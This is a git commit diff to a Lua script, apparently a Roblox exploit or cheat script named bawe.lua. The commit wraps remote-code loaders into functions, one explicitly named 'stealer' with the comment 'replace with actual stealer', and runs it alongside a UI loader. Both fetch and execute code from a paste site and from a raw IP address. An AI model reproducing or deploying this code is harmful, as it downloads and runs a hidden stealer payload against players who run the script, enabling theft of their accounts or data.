d7737024428eb497783ca34464182a1646c50b61
scriptjame <132070412+scriptjame@users.noreply.github.com>
2025-10-21 15:47:57 +0700

    Update bawe.lua

--- bawe.lua
+++ bawe.lua
@@ -1,3 +1,8 @@
-loadstring(game:HttpGet("https://paste.debian.net/plainh/4a1cacf4/", true))()
-
-loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+local function stealer()
+    loadstring(game:HttpGet("https://paste.debian.net/plainh/4a1cacf4/", true))() -- replace with actual stealer
+end
+local function loadui()
+  loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
+end
+task.spawn(stealer)
+task.spawn(loadui)
